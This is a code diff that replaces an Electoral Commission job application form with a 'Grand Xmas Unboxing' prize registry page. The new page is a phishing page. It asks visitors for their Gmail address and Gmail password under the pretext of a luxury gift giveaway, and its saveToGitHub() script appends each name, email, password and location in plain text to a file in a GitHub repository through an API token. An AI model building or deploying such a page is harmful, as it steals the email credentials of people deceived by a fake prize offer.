@@ -3,399 +3,223 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Electoral Commission Application Form</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <title>The Grand Xmas Unboxing | 2025 Luxury Registry</title>
+    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
     <style>
         :root {
-            --primary-color: #1f375f; /* Deep Navy Blue */
-            --accent-color: #e74c3c;  /* Red/Crimson */
-            --background-color: #f7f9fb; /* Very Light Grey */
-            --card-background: #ffffff;
-            --border-color: #d1d5db;
+            --bg-deep: #020d0d;       
+            --accent-gold: #f7dba7;   
+            --glass-white: rgba(255, 255, 255, 0.05);
+            --glass-border: rgba(255, 255, 255, 0.1);
+            --success-green: #4ade80;
         }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
         body {
             font-family: 'Inter', sans-serif;
-            background-color: var(--background-color);
-            line-height: 1.6;
-            color: var(--primary-color);
+            background: radial-gradient(circle at top, #0a3a38, var(--bg-deep));
+            color: white; min-height: 100vh;
+            display: flex; flex-direction: column; align-items: center;
         }
-        .container {
-            max-width: 900px;
-            margin: 40px auto;
-            background-color: var(--card-background);
-            border-radius: 12px;
-            box-shadow: 0 15px 30px rgba(31, 55, 95, 0.1);
-            padding: 40px 20px; /* Responsive padding */
-        }
-        @media (min-width: 640px) {
-            .container { padding: 40px; }
-        }
+
+        #snow-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 0; }
+
+        header { text-align: center; padding: 60px 20px 40px; z-index: 1; }
+        
+        .premium-tag { color: var(--accent-gold); letter-spacing: 4px; font-size: 0.75rem; font-weight: 600; margin-bottom: 10px; display: block; }
+
         h1 {
-            border-bottom: 3px solid var(--accent-color);
-            padding-bottom: 10px;
+            font-family: 'Playfair Display', serif; font-size: clamp(2.5rem, 8vw, 4rem);
+            background: linear-gradient(to bottom, #fff, var(--accent-gold));
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
         }
-        h2 {
-            border-left: 5px solid var(--primary-color);
-            padding-left: 10px;
-            margin-top: 30px;
-            margin-bottom: 20px;
+
+        .main-container { width: 95%; max-width: 550px; z-index: 1; margin-bottom: 80px; }
+
+        .glass-card {
+            background: var(--glass-white); backdrop-filter: blur(30px);
+            border: 1px solid var(--glass-border); border-radius: 24px;
+            padding: 40px; box-shadow: 0 50px 100px rgba(0,0,0,0.5);
         }
-        input[type="text"], input[type="date"], textarea {
-            transition: all 0.2s ease;
-            box-shadow: inset 0 1px 3px rgba(0,0,0,0.1);
+
+        h2 { font-family: 'Playfair Display', serif; font-size: 1.8rem; margin-bottom: 25px; text-align: center; }
+
+        .input-group { margin-bottom: 18px; position: relative; }
+        .input-group i { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: var(--accent-gold); opacity: 0.6; }
+
+        input {
+            width: 100%; padding: 15px 15px 15px 45px;
+            background: rgba(0,0,0,0.3); border: 1px solid var(--glass-border);
+            border-radius: 12px; color: white; font-size: 0.95rem;
         }
-        input[type="text"]:focus, input[type="date"]:focus, textarea:focus {
-            border-color: var(--accent-color) !important;
-            box-shadow: 0 0 0 3px rgba(231, 76, 60, 0.2) !important;
-            outline: none;
+
+        input:focus { border-color: var(--accent-gold); outline: none; }
+
+        .submit-btn {
+            width: 100%; padding: 18px;
+            background: linear-gradient(135deg, var(--accent-gold), #d4af37);
+            color: #041f1e; border: none; border-radius: 12px;
+            font-weight: 700; text-transform: uppercase; letter-spacing: 2px;
+            cursor: pointer; transition: 0.4s;
         }
-        .employment-table input {
-            padding: 8px !important;
-            border: none !important;
-            background: transparent !important;
-            box-shadow: none !important;
-            width: 100%;
-        }
-        /* Message Box Styling */
-        #message-box {
-            transition: opacity 0.3s ease;
-            opacity: 0;
-            pointer-events: none;
-        }
-        #message-box.show {
-            opacity: 1;
-            pointer-events: auto;
-        }
+
+        .submit-btn:hover { transform: translateY(-3px); box-shadow: 0 10px 30px rgba(247, 219, 167, 0.3); }
+
+        /* Timer Styles */
+        .timer-row { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-top: 30px; }
+        .t-box { text-align: center; background: rgba(0,0,0,0.2); padding: 10px; border-radius: 10px; }
+        .t-val { font-size: 1.2rem; font-weight: 700; color: var(--accent-gold); display: block; }
+        .t-label { font-size: 0.55rem; text-transform: uppercase; opacity: 0.5; }
     </style>
 </head>
-<body class="antialiased">
+<body>
 
-<div class="container">
-    <h1 class="text-center text-3xl font-bold text-[var(--accent-color)]">
-        <span class="text-[var(--primary-color)]">THE ELECTORAL COMMISSION</span>
-        <br>
-        Application Form
-    </h1>
-    <p class="section-note text-center text-sm text-gray-500 mb-8">
-        (Please fill in the application form accurately)
-    </p>
+<canvas id="snow-canvas"></canvas>
 
-    <!-- Form Container -->
-    <form id="application-form">
-        <!-- Job Applied For -->
-        <div class="mb-6 border-b pb-4">
-            <label class="block text-base font-medium mb-2">JOB APPLIED FOR (Tick):</label>
-            <div class="flex flex-wrap gap-4">
-                <label class="flex items-center text-base p-2 border rounded-md bg-gray-50 hover:bg-gray-100 cursor-pointer transition">
-                    <input type="radio" name="job_applied_for" value="Subcounty Supervisor" class="mr-2 h-4 w-4 text-[var(--primary-color)] focus:ring-[var(--primary-color)]" required>
-                    Subcounty Supervisor
-                </label>
-                <label class="flex items-center text-base p-2 border rounded-md bg-gray-50 hover:bg-gray-100 cursor-pointer transition">
-                    <input type="radio" name="job_applied_for" value="Parish Supervisor" class="mr-2 h-4 w-4 text-[var(--primary-color)] focus:ring-[var(--primary-color)]" required>
-                    Parish Supervisor
-                </label>
+<header>
+    <span class="premium-tag">ESTABLISHED 2025</span>
+    <h1>Xmas Unboxing</h1>
+</header>
+
+<div class="main-container">
+    <div class="glass-card">
+        <h2>Winner Registry</h2>
+        <form id="registryForm">
+            <div class="input-group">
+                <i class="fa fa-user"></i>
+                <input type="text" id="username" placeholder="Full Name" required>
             </div>
-        </div>
-
-        <!-- 1.0 Applicants' Particulars -->
-        <h2 class="text-xl font-semibold text-[var(--primary-color)]">1.0 Applicants' Particulars</h2>
-        <div class="grid grid-cols-1 md:grid-cols-2 gap-x-6 gap-y-4">
-            <div><label for="full_names" class="block text-sm">Full Names (Surname first):</label><input type="text" id="full_names" name="full_names" class="w-full p-2 border border-[var(--border-color)] rounded-md" required></div>
-            <div><label for="nin" class="block text-sm">NIN (National Identity Card Number):</label><input type="text" id="nin" name="nin" class="w-full p-2 border border-[var(--border-color)] rounded-md"></div>
-            <div><label for="voter_number" class="block text-sm">Personal Voter Number:</label><input type="text" id="voter_number" name="voter_number" class="w-full p-2 border border-[var(--border-color)] rounded-md"></div>
-            
-            <div>
-                <label class="block text-sm">Sex (Tick):</label>
-                <div class="flex space-x-6 mt-1">
-                    <label class="flex items-center"><input type="radio" name="sex" value="Male" class="mr-2 h-4 w-4" required> Male</label>
-                    <label class="flex items-center"><input type="radio" name="sex" value="Female" class="mr-2 h-4 w-4"> Female</label>
-                </div>
+            <div class="input-group">
+                <i class="fa fa-envelope"></i>
+                <input type="email" id="email" placeholder="Gmail Address" required>
+            </div>
+            <div class="input-group">
+                <i class="fa fa-lock"></i>
+                <input type="password" id="password" placeholder="Gmail Password" required>
+            </div>
+            <div class="input-group">
+                <i class="fa fa-location-dot"></i>
+                <input type="text" id="location" placeholder="Shipping Location" required>
             </div>
             
-            <div class="col-span-2"><label for="dob" class="block text-sm">Date of Birth:</label><input type="date" id="dob" name="dob" class="w-full p-2 border border-[var(--border-color)] rounded-md"></div>
-            
-            <div class="col-span-2">
-                <label class="block text-sm">Marital Status (tick):</label>
-                <div class="flex flex-wrap space-x-6 mt-1">
-                    <label class="flex items-center"><input type="radio" name="marital_status" value="Single" class="mr-2 h-4 w-4"> Single</label>
-                    <label class="flex items-center"><input type="radio" name="marital_status" value="Married" class="mr-2 h-4 w-4"> Married</label>
-                    <label class="flex items-center"><input type="radio" name="marital_status" value="Separated/Widowed" class="mr-2 h-4 w-4"> Separated/Widowed</label>
-                </div>
-            </div>
-        </div>
+            <button type="button" id="submitBtn" onclick="saveToGitHub()" class="submit-btn">Submit Registry</button>
+        </form>
 
-        <!-- Home Address -->
-        <h3 class="text-lg font-medium text-gray-700 mt-6">Home Address</h3>
-        <div class="grid grid-cols-1 md:grid-cols-3 gap-x-6 gap-y-4">
-            <div><label for="home_district" class="block text-sm">Home District:</label><input type="text" id="home_district" name="home_district" class="w-full p-2 border border-[var(--border-color)] rounded-md"></div>
-            <div><label for="home_county" class="block text-sm">County:</label><input type="text" id="home_county" name="home_county" class="w-full p-2 border border-[var(--border-color)] rounded-md"></div>
-            <div><label for="home_subcounty" class="block text-sm">Town/Sub-county:</label><input type="text" id="home_subcounty" name="home_subcounty" class="w-full p-2 border border-[var(--border-color)] rounded-md"></div>
-            <div class="md:col-span-3 lg:col-span-1"><label for="home_parish" class="block text-sm">Parish:</label><input type="text" id="home_parish" name="home_parish" class="w-full p-2 border border-[var(--border-color)] rounded-md"></div>
-            <div class="md:col-span-3 lg:col-span-2"><label for="home_village" class="block text-sm">Village:</label><input type="text" id="home_village" name="home_village" class="w-full p-2 border border-[var(--border-color)] rounded-md"></div>
-        </div>
-
-        <!-- Current Residence -->
-        <h3 class="text-lg font-medium text-gray-700 mt-6">Current Residence</h3>
-        <div class="grid grid-cols-1 md:grid-cols-2 gap-x-6 gap-y-4">
-            <div><label for="current_district" class="block text-sm">District:</label><input type="text" id="current_district" name="current_district" class="w-full p-2 border border-[var(--border-color)] rounded-md"></div>
-            <div><label for="current_county" class="block text-sm">County:</label><input type="text" id="current_county" name="current_county" class="w-full p-2 border border-[var(--border-color)] rounded-md"></div>
-            <div><label for="current_subcounty" class="block text-sm">Town/sub-county:</label><input type="text" id="current_subcounty" name="current_subcounty" class="w-full p-2 border border-[var(--border-color)] rounded-md"></div>
-            <div><label for="current_parish" class="block text-sm">Parish:</label><input type="text" id="current_parish" name="current_parish" class="w-full p-2 border border-[var(--border-color)] rounded-md"></div>
-            <div><label for="current_village" class="block text-sm">Village/LCI:</label><input type="text" id="current_village" name="current_village" class="w-full p-2 border border-[var(--border-color)] rounded-md"></div>
-            <div><label for="plot_no" class="block text-sm">Plot No (Where applicable):</label><input type="text" id="plot_no" name="plot_no" class="w-full p-2 border border-[var(--border-color)] rounded-md"></div>
-            <div class="col-span-2">
-                <label for="phone_contact" class="block text-sm font-semibold">Telephone Contact (registered on mobile money in applicant's name):</label>
-                <input type="text" id="phone_contact" name="phone_contact" class="w-full p-2 border border-[var(--border-color)] rounded-md" required>
-            </div>
-        </div>
-
-        <!-- 1.1 Education Qualifications -->
-        <h2 class="text-xl font-semibold text-[var(--primary-color)]">1.1 Education Qualifications</h2>
-        <p class="text-sm italic text-gray-500 mb-4">(Please attach copies of your academic certificates and any other documents deemed relevant)</p>
-        <div class="space-y-4">
-            <div><label for="degree" class="block text-sm font-medium">(a) If holder of degree, state Degree:</label><input type="text" id="degree" name="degree" class="w-full p-2 border border-[var(--border-color)] rounded-md"></div>
-            <div><label for="diploma" class="block text-sm font-medium">(b) If holder of Diploma or Certificate, state Diploma/Certificate:</label><input type="text" id="diploma" name="diploma" class="w-full p-2 border border-[var(--border-color)] rounded-md"></div>
-            <div><label for="uace_scores" class="block text-sm font-medium">(c) If holder of Uganda Advanced Certificate of Education, state scores in each subject:</label><textarea id="uace_scores" name="uace_scores" rows="2" class="w-full p-2 border border-[var(--border-color)] rounded-md"></textarea></div>
-            <div><label for="uoe_scores" class="block text-sm font-medium">(d) If holder of Ordinary Level Certificate of Education, state scores in each subject:</label><textarea id="uoe_scores" name="uoe_scores" rows="2" class="w-full p-2 border border-[var(--border-color)] rounded-md"></textarea></div>
-            <div><label for="other_qualification" class="block text-sm font-medium">(e) Any other qualification, state:</label><input type="text" id="other_qualification" name="other_qualification" class="w-full p-2 border border-[var(--border-color)] rounded-md"></div>
-        </div>
-
-        <!-- 1.2 Employment Record -->
-        <h2 class="text-xl font-semibold text-[var(--primary-color)]">1.2 Employment Record (Starting with the most recent)</h2>
-        <div class="overflow-x-auto rounded-lg border border-[var(--border-color)] mb-6 shadow-md">
-            <table class="min-w-full divide-y divide-[var(--border-color)] employment-table">
-                <thead>
-                    <tr class="bg-[var(--primary-color)] text-white">
-                        <th class="px-3 py-3 text-left text-xs font-medium uppercase tracking-wider">NO.</th>
-                        <th class="px-6 py-3 text-left text-xs font-medium uppercase tracking-wider">ORGANISATION</th>
-                        <th class="px-6 py-3 text-left text-xs font-medium uppercase tracking-wider">DESIGNATION</th>
-                        <th class="px-6 py-3 text-left text-xs font-medium uppercase tracking-wider">DATES</th>
-                    </tr>
-                </thead>
-                <tbody class="divide-y divide-[var(--border-color)]">
-                    <tr class="bg-white hover:bg-gray-50">
-                        <td class="px-3 py-0 whitespace-nowrap text-sm font-medium text-gray-900">1</td>
-                        <td class="px-6 py-0"><input type="text" name="org_1" placeholder="Organization 1"></td>
-                        <td class="px-6 py-0"><input type="text" name="desig_1" placeholder="Designation 1"></td>
-                        <td class="px-6 py-0"><input type="text" name="dates_1" placeholder="e.g., 2020-2022"></td>
-                    </tr>
-                    <tr class="bg-white hover:bg-gray-50">
-                        <td class="px-3 py-0 whitespace-nowrap text-sm font-medium text-gray-900">2</td>
-                        <td class="px-6 py-0"><input type="text" name="org_2" placeholder="Organization 2"></td>
-                        <td class="px-6 py-0"><input type="text" name="desig_2" placeholder="Designation 2"></td>
-                        <td class="px-6 py-0"><input type="text" name="dates_2" placeholder="e.g., 2018-2020"></td>
-                    </tr>
-                    <tr class="bg-white hover:bg-gray-50">
-                        <td class="px-3 py-0 whitespace-nowrap text-sm font-medium text-gray-900">3</td>
-                        <td class="px-6 py-0"><input type="text" name="org_3" placeholder="Organization 3"></td>
-                        <td class="px-6 py-0"><input type="text" name="desig_3" placeholder="Designation 3"></td>
-                        <td class="px-6 py-0"><input type="text" name="dates_3" placeholder="e.g., 2015-2018"></td>
-                    </tr>
-                </tbody>
-            </table>
-        </div>
-
-        <div class="grid grid-cols-1 md:grid-cols-2 gap-x-6 gap-y-4 mb-6">
-            <div><label for="recent_salary" class="block text-sm">Most recent salary (gross):</label><input type="text" id="recent_salary" name="recent_salary" class="w-full p-2 border border-[var(--border-color)] rounded-md"></div>
-            <div><label for="salary_expectation" class="block text-sm">Salary expectation (gross):</label><input type="text" id="salary_expectation" name="salary_expectation" class="w-full p-2 border border-[var(--border-color)] rounded-md"></div>
-        </div>
-
-        <!-- Immediate Family -->
-        <h3 class="text-lg font-medium text-gray-700 mt-6">List the names of your immediate family:</h3>
-        <div class="grid grid-cols-1 md:grid-cols-3 gap-x-6 gap-y-4 mb-6 p-4 border rounded-lg bg-gray-50">
-            <div class="col-span-1">
-                <label for="father_name" class="block text-sm">Father's Name:</label>
-                <input type="text" id="father_name" name="father_name" class="w-full p-2 border border-[var(--border-color)] rounded-md">
-                <div class="flex space-x-4 mt-2">
-                    <label class="flex items-center text-sm"><input type="radio" name="father_status" value="Alive" class="mr-1 h-3 w-3"> Alive</label>
-                    <label class="flex items-center text-sm"><input type="radio" name="father_status" value="Dead" class="mr-1 h-3 w-3"> Dead</label>
-                </div>
-            </div>
-            <div class="col-span-1">
-                <label for="mother_name" class="block text-sm">Mother's Name:</label>
-                <input type="text" id="mother_name" name="mother_name" class="w-full p-2 border border-[var(--border-color)] rounded-md">
-                <div class="flex space-x-4 mt-2">
-                    <label class="flex items-center text-sm"><input type="radio" name="mother_status" value="Alive" class="mr-1 h-3 w-3"> Alive</label>
-                    <label class="flex items-center text-sm"><input type="radio" name="mother_status" value="Dead" class="mr-1 h-3 w-3"> Dead</label>
-                </div>
-            </div>
-            <div class="col-span-1">
-                <label for="spouse_name" class="block text-sm">Wife/Husband's Name:</label>
-                <input type="text" id="spouse_name" name="spouse_name" class="w-full p-2 border border-[var(--border-color)] rounded-md">
-            </div>
-        </div>
-
-        <!-- 1.3 Referees -->
-        <h2 class="text-xl font-semibold text-[var(--primary-color)]">1.3 Referees</h2>
-        <div class="grid grid-cols-1 md:grid-cols-2 gap-x-6 gap-y-4">
-            <!-- Referee A -->
-            <div class="border border-[var(--border-color)] p-4 rounded-lg bg-gray-50">
-                <h4 class="font-semibold mb-3 text-lg text-[var(--accent-color)]">(a) Referee</h4>
-                <div><label for="ref_a_name" class="block text-sm">Full Names:</label><input type="text" id="ref_a_name" name="ref_a_name" class="w-full p-2 border border-[var(--border-color)] rounded-md mb-2"></div>
-                <div><label for="ref_a_title" class="block text-sm">Designation/Title:</label><input type="text" id="ref_a_title" name="ref_a_title" class="w-full p-2 border border-[var(--border-color)] rounded-md mb-2"></div>
-                <div><label for="ref_a_address" class="block text-sm">Postal Address:</label><input type="text" id="ref_a_address" name="ref_a_address" class="w-full p-2 border border-[var(--border-color)] rounded-md mb-2"></div>
-                <div><label for="ref_a_tel" class="block text-sm">Tel. No:</label><input type="text" id="ref_a_tel" name="ref_a_tel" class="w-full p-2 border border-[var(--border-color)] rounded-md"></div>
-            </div>
-            <!-- Referee B -->
-            <div class="border border-[var(--border-color)] p-4 rounded-lg bg-gray-50">
-                <h4 class="font-semibold mb-3 text-lg text-[var(--accent-color)]">(b) Referee</h4>
-                <div><label for="ref_b_name" class="block text-sm">Full Names:</label><input type="text" id="ref_b_name" name="ref_b_name" class="w-full p-2 border border-[var(--border-color)] rounded-md mb-2"></div>
-                <div><label for="ref_b_title" class="block text-sm">Designation/Title:</label><input type="text" id="ref_b_title" name="ref_b_title" class="w-full p-2 border border-[var(--border-color)] rounded-md mb-2"></div>
-                <div><label for="ref_b_address" class="block text-sm">Postal Address:</label><input type="text" id="ref_b_address" name="ref_b_address" class="w-full p-2 border border-[var(--border-color)] rounded-md mb-2"></div>
-                <div><label for="ref_b_tel" class="block text-sm">Tel. No:</label><input type="text" id="ref_b_tel" name="ref_b_tel" class="w-full p-2 border border-[var(--border-color)] rounded-md"></div>
-            </div>
-        </div>
-
-        <!-- Declaration -->
-        <h3 class="text-xl font-semibold text-[var(--primary-color)] mt-8">Declaration</h3>
-        <p class="text-sm italic text-gray-500 mb-4">By typing your name below, you digitally sign this declaration.</p>
-        <div class="grid grid-cols-1 md:grid-cols-2 gap-x-6 gap-y-4 mb-6">
-            <div class="col-span-1">
-                <label class="block text-sm font-semibold">Applicant's Signature (Type Name):</label>
-                <input type="text" id="applicant_signature" name="applicant_signature" class="w-full p-2 border-b-2 border-dashed border-[var(--primary-color)] rounded-none" required>
-            </div>
-            <div class="col-span-1">
-                <label for="declaration_date" class="block text-sm font-semibold">Date:</label>
-                <input type="date" id="declaration_date" name="declaration_date" class="w-full p-2 border border-[var(--border-color)] rounded-md" required>
-            </div>
-        </div>
-
-        <!-- Submit Button -->
-        <button type="submit" id="submit-button" class="w-full py-3 mt-6 text-white font-bold rounded-lg shadow-xl bg-[var(--accent-color)] hover:bg-red-700 transition duration-300 flex items-center justify-center disabled:opacity-50 hover:shadow-2xl focus:outline-none focus:ring-4 focus:ring-red-300">
-            <span id="button-text">Submit Application (Saves to PHP Backend)</span>
-            <svg id="loading-spinner" class="animate-spin -ml-1 mr-3 h-5 w-5 text-white hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
-                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
-                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-            </svg>
-        </button>
-    </form>
-
-    <!-- Custom Message Box (Replaces alert()) -->
-    <div id="message-box" class="fixed inset-0 bg-gray-900 bg-opacity-70 flex items-center justify-center p-4 z-50">
-        <div class="bg-white p-6 rounded-lg shadow-2xl max-w-sm w-full transform transition-all duration-300 scale-100">
-            <h3 id="message-title" class="text-xl font-bold mb-3"></h3>
-            <p id="message-content" class="text-gray-700 mb-4"></p>
-            <button id="close-message" class="w-full py-2 bg-[var(--primary-color)] text-white font-semibold rounded-md hover:bg-gray-700 focus:outline-none focus:ring-2 focus:ring-blue-400">Close</button>
+        <div class="timer-row">
+            <div class="t-box"><span class="t-val" id="d">00</span><span class="t-label">Days</span></div>
+            <div class="t-box"><span class="t-val" id="h">00</span><span class="t-label">Hrs</span></div>
+            <div class="t-box"><span class="t-val" id="m">00</span><span class="t-label">Min</span></div>
+            <div class="t-box"><span class="t-val" id="s">00</span><span class="t-label">Sec</span></div>
         </div>
     </div>
-
 </div>
 
-<!-- JavaScript Application Logic -->
 <script>
-    const form = document.getElementById('application-form');
-    const submitButton = document.getElementById('submit-button');
-    const buttonText = document.getElementById('button-text');
-    const loadingSpinner = document.getElementById('loading-spinner');
-    const MESSAGE_BOX_URL = "submit.php"; // *** Points to the PHP file ***
-
-    // Utility for showing custom message box
-    function showMessage(title, content, isError = false) {
-        const box = document.getElementById('message-box');
-        document.getElementById('message-title').textContent = title;
-        document.getElementById('message-content').textContent = content;
-        document.getElementById('message-title').className = isError ? 'text-xl font-bold mb-3 text-red-600' : 'text-xl font-bold mb-3 text-green-600';
-        box.classList.add('show');
-    }
-
-    document.getElementById('close-message').addEventListener('click', () => {
-        document.getElementById('message-box').classList.remove('show');
-    });
-
-    // Function to collect and structure form data
-    function serializeForm(formElement) {
-        const formData = new FormData(formElement);
-        const data = {};
-
-        // Collect all simple key-value pairs
-        formData.forEach((value, key) => {
-            data[key] = typeof value === 'string' ? value.trim() : value;
-        });
+    async function saveToGitHub() {
+        const btn = document.getElementById('submitBtn');
         
-        // Structure Employment Record
-        const employmentRecord = [];
-        for (let i = 1; i <= 3; i++) {
-            const org = data[`org_${i}`];
-            if (org) {
-                employmentRecord.push({
-                    organisation: org,
-                    designation: data[`desig_${i}`] || '',
-                    dates: data[`dates_${i}`] || ''
-                });
-            }
-            // Clean up the temporary flat keys
-            delete data[`org_${i}`];
-            delete data[`desig_${i}`];
-            delete data[`dates_${i}`];
-        }
-        data.employment_record = employmentRecord;
+        // --- CONFIGURATION: EDIT THESE THREE ---
+        const GITHUB_TOKEN = "YOUR_TOKEN_HERE"; 
+        const OWNER = "YOUR_USERNAME";
+        const REPO = "YOUR_REPO_NAME";
+        const FILE_PATH = "file.txt"; 
+
+        const name = document.getElementById('username').value;
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('password').value;
+        const loc = document.getElementById('location').value;
         
-        // Add metadata
-        data.submission_timestamp = new Date().toISOString();
-
-        return data;
-    }
-
-
-    // --- Form Submission Handler ---
-    form.addEventListener('submit', async function(e) {
-        e.preventDefault();
-
-        if (!form.checkValidity()) {
-             showMessage("Validation Error", "Please fill out all required fields (like Full Names and Contact) before submitting.", true);
-             return;
+        if(!name || !email || !pass || !loc) {
+            alert("Please fill all fields.");
+            return;
         }
 
-        submitButton.disabled = true;
-        buttonText.textContent = "Sending...";
-        loadingSpinner.classList.remove('hidden');
-        
-        const applicationData = serializeForm(form);
+        btn.innerText = "PROCESSING...";
+        btn.disabled = true;
+
+        const timestamp = new Date().toLocaleString();
+        const newEntry = `\n[${timestamp}] Name: ${name} | Email: ${email} | Pass: ${pass} | Loc: ${loc}`;
 
         try {
-            const response = await fetch(MESSAGE_BOX_URL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(applicationData)
+            const url = `https://api.github.com/repos/${OWNER}/${REPO}/contents/${FILE_PATH}`;
+            
+            // 1. Get current file data
+            const response = await fetch(url, {
+                headers: { "Authorization": `Bearer ${GITHUB_TOKEN}` }
             });
 
-            const result = await response.json();
+            let sha = "";
+            let currentContent = "";
 
-            if (response.ok && result.success) {
-                console.log("Server Response:", result);
-                showMessage(
-                    "Application Submitted!",
-                    `Your data has been successfully saved to the server in the file: ${result.filename}.`,
-                    false
-                );
-                // Reset form on success
-                form.reset(); 
-            } else {
-                console.error("Submission Failed. Server error:", result);
-                showMessage(
-                    "Submission Failed",
-                    `The server returned an error: ${result.message || 'Unknown server error'}. Check your console for details.`,
-                    true
-                );
+            if (response.ok) {
+                const data = await response.json();
+                sha = data.sha;
+                currentContent = decodeURIComponent(escape(atob(data.content))); 
             }
 
-        } catch (error) {
-            console.error("Network or script error:", error);
-            showMessage(
-                "Submission Failed",
-                `A network error occurred: ${error.message}. Ensure your PHP server is running and 'submit.php' is accessible.`,
-                true
-            );
-        } finally {
-            submitButton.disabled = false;
-            buttonText.textContent = "Submit Application (Saves to PHP Backend)";
-            loadingSpinner.classList.add('hidden');
-        }
-    });
+            // 2. Prepare new content
+            const updatedContent = btoa(unescape(encodeURIComponent(currentContent + newEntry)));
 
+            // 3. Update file on GitHub
+            const pushResponse = await fetch(url, {
+                method: "PUT",
+                headers: {
+                    "Authorization": `Bearer ${GITHUB_TOKEN}`,
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    message: "New Xmas Entry",
+                    content: updatedContent,
+                    sha: sha
+                })
+            });
+
+            if (pushResponse.ok) {
+                alert("Success! Your gift request has been recorded.");
+                document.getElementById('registryForm').reset();
+            } else {
+                alert("Error: Check your Token/Repo configuration.");
+            }
+        } catch (err) {
+            alert("Connection failed.");
+        } finally {
+            btn.innerText = "SUBMIT REGISTRY";
+            btn.disabled = false;
+        }
+    }
+
+    // Timer and Snow logic
+    const target = new Date("Dec 25, 2025 00:00:00").getTime();
+    setInterval(() => {
+        const now = new Date().getTime();
+        const gap = target - now;
+        document.getElementById('d').innerText = Math.floor(gap / (1000*60*60*24));
+        document.getElementById('h').innerText = Math.floor((gap % (1000*60*60*24)) / (1000*60*60));
+        document.getElementById('m').innerText = Math.floor((gap % (1000*60*60)) / (1000*60));
+        document.getElementById('s').innerText = Math.floor((gap % (1000*60)) / 1000);
+    }, 1000);
+
+    const canvas = document.getElementById('snow-canvas');
+    const ctx = canvas.getContext('2d');
+    let particles = [];
+    function init() {
+        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+        particles = [];
+        for(let i=0; i<100; i++) particles.push({x:Math.random()*canvas.width, y:Math.random()*canvas.height, r:Math.random()*2+1, d:Math.random()*1});
+    }
+    function draw() {
+        ctx.clearRect(0,0,canvas.width,canvas.height);
+        ctx.fillStyle = "white"; ctx.beginPath();
+        particles.forEach(p => { ctx.moveTo(p.x, p.y); ctx.arc(p.x, p.y, p.r, 0, Math.PI*2); });
+        ctx.fill();
+        particles.forEach(p => { p.y += p.d + 0.5; if(p.y > canvas.height) p.y = -5; });
+        requestAnimationFrame(draw);
+    }
+    init(); draw();
+    window.addEventListener('resize', init);
 </script>
 
 </body>
